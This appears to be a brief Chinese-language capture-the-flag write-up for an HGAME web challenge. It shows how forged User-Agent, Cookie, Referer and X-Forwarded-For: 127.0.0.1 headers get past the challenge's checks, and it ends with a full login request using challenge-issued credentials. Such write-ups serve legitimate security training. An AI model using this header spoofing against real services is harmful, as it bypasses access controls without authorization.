![[Pasted image 20230131091204.png|500]]

![[Pasted image 20230131091221.png|500]]

一开始没想到是改`UA`的我破大防（

```http
User-Agent: Cute-Bunny
```

```
每一个能够成为会员的顾客们都应该持有名为Vidar的邀请码（code）
```

```http
Cookie: code=Vidar
```

```
由于特殊原因，我们只接收来自于bunnybunnybunny.com的会员资格申请
```

```http
Referer: bunnybunnybunny.com
```

```
就差最后一个本地的请求，就能拿到会员账号啦
```

```http
X-Forwarded-For: 127.0.0.1
```

```
username:luckytoday password:happy123（请以json请求方式登陆）
```

```http
GET / HTTP/1.1
Host: week-1.hgame.lwsec.cn:32575
Upgrade-Insecure-Requests: 1
User-Agent: Cute-Bunny
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: code=Vidar
Referer: bunnybunnybunny.com
X-Forwarded-For: 127.0.0.1
Connection: close
Content-Length: 49

{"username":"luckytoday", "password": "happy123"}
```

![[Pasted image 20230131093901.png|700]]

#Web #HTTP #Header 